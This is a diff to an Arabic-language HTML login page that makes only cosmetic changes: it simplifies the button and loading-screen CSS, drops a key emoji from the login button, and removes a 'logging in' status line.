@@ -21,7 +21,7 @@
   .field{width:100%;height:48px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink);font-size:15px;padding:0 12px;outline:none}
   .field::placeholder{color:#9aa3af}
   select.field{appearance:none;-webkit-appearance:none;background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>');background-repeat:no-repeat;background-position:left 12px center;padding-left:36px}
-  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
+  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
   .btn[disabled]{opacity:.6;cursor:not-allowed}
   .warn{font-size:12px;color:#444;line-height:1.7;margin-top:12px;text-align:center}
 
@@ -34,8 +34,6 @@
     align-items:center;
     justify-content:center;
     z-index:999;
-    flex-direction:column;
-    gap:12px;
     display:none;
   }
   .spinner{
@@ -80,7 +78,7 @@
       </div>
 
       <button id="go" class="btn" disabled>
-        🔑 تسجيل الدخول
+        تسجيل الدخول
       </button>
 
       <div class="warn">
@@ -93,7 +91,6 @@
 <!-- شاشة التحميل -->
 <div class="loading-screen" id="loading-screen">
   <div class="spinner"></div>
-  <div style="color:#0052ff;font-weight:600">جاري تسجيل الدخول...</div>
 </div>
 
 <script>
